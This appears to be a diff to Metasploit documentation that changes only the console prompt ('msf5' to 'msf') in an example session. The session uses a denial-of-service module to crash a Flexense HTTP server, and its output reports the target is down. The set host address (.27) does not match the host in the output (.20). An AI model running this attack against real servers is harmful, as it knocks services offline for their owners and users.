@@ -55,12 +55,12 @@ Check the box saying: ```Enable web server on port:...```
 ### WINDOWS 7/10
 
 ```
-msf5 > use auxiliary/dos/http/flexense_http_server_dos 
-msf5 auxiliary(dos/http/flexense_http_server_dos) > set rhost 192.168.1.27
+msf > use auxiliary/dos/http/flexense_http_server_dos 
+msf auxiliary(dos/http/flexense_http_server_dos) > set rhost 192.168.1.27
 rhost => 192.168.1.27
-msf5 auxiliary(dos/http/flexense_http_server_dos) > set rport 80
+msf auxiliary(dos/http/flexense_http_server_dos) > set rport 80
 rport => 80
-msf5 auxiliary(dos/http/flexense_http_server_dos) > run
+msf auxiliary(dos/http/flexense_http_server_dos) > run
 
 [*] 192.168.1.20:80 - Triggering the vulnerability
 [+] 192.168.1.20:80 - DoS successful 192.168.1.20 is down !
